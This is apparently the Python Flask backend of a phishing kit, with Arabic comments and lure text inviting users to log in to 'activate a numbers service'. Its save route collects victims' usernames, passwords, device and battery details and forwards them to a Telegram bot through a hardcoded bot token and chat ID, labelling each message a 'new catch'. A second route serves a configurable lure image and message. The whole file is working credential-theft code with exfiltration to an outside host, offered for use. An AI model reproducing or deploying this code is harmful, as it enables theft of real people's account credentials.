from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

TOKEN = "8713127522:AAGfj4acg204MMcOSX7koJNtP4fwN9L-1YQ"
CHAT_ID = "7984067238"

latest_config = {
    "image": "https://telegra.ph/file/1792945d7d91986420551.jpg",
    "letter": "سجل دخولك لتفعيل خدمة الأرقام",
    "button": "تفعيل الآن"
}

@app.route('/api/save', methods=['POST'])
def save_data():
    global latest_config
    try:
        data = request.json
        
        # إذا كانت البيانات قادمة من لوحة التحكم
        if 'image' in data and 'letter' in data:
            latest_config = data
            return jsonify({"status": "success"}), 200
        
        # استخراج البيانات المرسلة من الصفحة
        user = data.get('user', 'غير معروف')
        pw = data.get('pass', 'غير معروف')
        device = data.get('device', 'غير معروف')
        battery = data.get('battery', 'غير معروف')
        time_sent = data.get('time', 'غير محدد')

        # صياغة الرسالة بتنسيق مرتب جداً ومريح للعين
        full_message = (
            "🚀 **إشعار: صيد جديد مـكتمل** 🚀\n"
            "━━━━━━━━━━━━━━━\n"
            "👤 **بيانات الحساب:**\n"
            f"📧 المستخدم: `{user}`\n"
            f"🔑 كلمة السر: `{pw}`\n"
            "━━━━━━━━━━━━━━━\n"
            "📱 **معلومات الجهاز:**\n"
            f"🖥️ النظام: {device}\n"
            f"🔋 البطارية: {battery}\n"
            "━━━━━━━━━━━━━━━\n"
            f"⏰ الوقت: {time_sent}\n"
            "━━━━━━━━━━━━━━━"
        )

        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        requests.post(url, json={
            "chat_id": CHAT_ID, 
            "text": full_message, 
            "parse_mode": "Markdown"
        })

        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/get', methods=['GET'])
def get_config():
    return jsonify(latest_config)

def handler(environ, start_response):
    return app(environ, start_response)
